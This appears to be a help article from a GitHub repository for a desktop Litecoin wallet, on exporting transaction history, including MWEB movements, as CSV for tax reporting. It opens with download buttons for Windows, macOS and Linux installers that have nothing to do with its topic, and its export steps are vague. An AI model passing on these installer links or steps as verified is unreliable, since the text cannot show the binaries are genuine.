![Lite Wallet](assets/banner-article.png)

# Export transactions for tax reporting

A history file for tax season that includes the MWEB movements.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-2578D1?style=for-the-badge&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-2578D1?style=for-the-badge&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-2578D1?style=flat-square&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-2578D1?style=flat-square&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Lite Wallet exports your transaction history as a CSV file, including MWEB peg-in and peg-out movements. The file gives you the movements in a form an accountant or tax tool can import, including MWEB peg-in and peg-out rows, and it does not calculate tax, value anything in fiat, or decide what is taxable.

## What the export contains

The export is a record of what the wallet did, not a tax return. Each row describes one movement: when it happened, whether it was sent or received, how much LTC moved, what fee was paid, which address was involved and which transaction carried it.

That structure is deliberately plain, because its job is to be imported elsewhere. A spreadsheet, an accountant or a crypto tax tool can all consume the same file; none of them needs the wallet's opinion about cost basis.

| Field a record needs | Why it matters | What it cannot tell you |
|---|---|---|
| date and time | when the transaction was recorded | the fiat value at that moment |
| direction | sent or received | whether it is income or a transfer |
| amount | LTC moved | the value in your currency |
| fee | network fee paid | who should claim the deduction |
| address | counterparty or own address | who owns that address |
| transaction ID | the on-chain reference | a tax category |

## Why MWEB rows matter

A peg-in and a peg-out are transactions, and they appear in the export like any other movement. That is important because a private balance is still a balance: coins that moved into MWEB and back out have a history, and a tax record that omits them is incomplete.

| Movement | Appears in export | Note |
|---|---|---|
| standard send | yes | with fee and destination |
| standard receive | yes | with source address |
| MWEB peg-in | yes | a transaction with a fee |
| MWEB peg-out | yes | a transaction with a fee |
| private transfer inside MWEB | yes, as a movement | amounts are not public on-chain, the local record is yours |

The last row is where a private wallet and a public tax system meet. Your export is the only place that record exists in a usable form, so export before you wipe a device or move wallets. [The traceability guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/litewallet-mweb-and-litecoin-traceability.md) sets out what stays public once a movement sits inside MWEB, which is the question an accountant asks first.

## How to export

1. Open the wallet and find the export option in the transaction or settings area.
2. Choose the date range you need - a tax year is the usual unit.
3. Export the CSV and save it somewhere you control, not to a shared drive.
4. Open it in a spreadsheet and check that the first and last rows match what you expect.
5. Hand it to your accountant or import it into your tax tool.

## Reading the file without making mistakes

The most common error is treating every incoming row as income. A transfer between your own wallets is not a sale, and a peg-in is not a purchase; both are movements of the same asset. A tax tool needs those rows marked as transfers, and that labelling is your job, not the wallet's.

The second most common error is ignoring fees. Fees are a cost, and whether they are deductible depends on your jurisdiction, but the rows exist so the decision can be made with the numbers in hand.

| Mistake | Why it happens | How to avoid it |
|---|---|---|
| counting a self-transfer as income | direction column says received | label own-address rows as transfers |
| double-counting a peg | peg-in and peg-out both appear | treat the pair as one movement of the same coins |
| missing fees | fee column overlooked | sum the fee column separately |
| exporting a partial year | date range left at default | set the range explicitly |
| losing the file on a device wipe | export deferred | export before uninstalling or moving |

## Keeping a record that survives the wallet

A transaction export is a snapshot of one device's view, and devices change. The habit that makes tax reporting painless is exporting at the end of each period rather than at the end of each year, because a wallet that has been reinstalled, replaced or reset rebuilds its history by scanning, and a scan that has not finished produces a short file.

That matters most for a private balance. A private transfer is recorded on-chain without publishing its amount, so the local record is the only convenient source for the figure. If a phone is lost after a year of private transfers and the export was never taken, the record has to be reconstructed from the restored wallet's own scan, which works only while the paper key exists. Making and testing that backup is the subject of [the paper key guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-paper-key-backup-and-restore.md). A merchant who needs the same record per sale has the merchant side in [the merchant payments guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/accept-litecoin-payments-using-litewallet.md).

The second habit is naming. A file called "export.csv" in a downloads folder is indistinguishable from last year's attempt. Put the date range in the name, keep one folder, and note which wallet and address it came from, so an accountant's question three months later does not require a forensic exercise.

## What to do when the numbers do not match

Two things make an export disagree with a remembered balance: an unfinished scan, and a period boundary. The first produces a short file, because the wallet can only export what it has processed. The second produces a puzzling one, because a transaction that broadcast late in December can confirm in January, and different tools assign it to different periods.

Both are handled the same way: export again after the scan completes, and keep the raw file even after it has been imported somewhere. The raw file is the evidence; the summary is an interpretation. If a discrepancy survives a complete rescan, compare the transaction identifiers rather than the totals - an identifier either appears in both files or it does not, which localises the problem immediately.

## Privacy of the file itself

A transaction export is a complete picture of your activity, including addresses you may not want to publish. Treat the CSV the way you treat a bank statement: share it with the accountant who needs it, encrypt it if you send it, and do not leave it in a synced folder that others can read.

If you want the record without the exposure, export the range you need rather than the whole history, and keep the file local.

## FAQ

### Does the export include MWEB transactions?

Yes. Peg-in and peg-out movements appear as transactions with their fees, and private transfers appear as local movements. The export is the practical record of a private balance.

### Is this a tax calculation?

No. It is a transaction record. It does not compute gains, value anything in fiat, or decide what is taxable - those steps belong to your accountant or your tax software.

### Which columns does the file contain?

Date, direction, amount, fee, address and transaction identifier. That is enough for a spreadsheet or an import, and deliberately not enough to assert a tax treatment.

### Can I export a specific date range?

Yes. Set the range explicitly for the period you need; leaving the default is how partial-year exports happen.

### What if I no longer have the device?

The chain has the history, and restoring the wallet from the paper key rebuilds it, after which you can export again. If the paper key is gone, the record is gone with the wallet.

Export works in the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
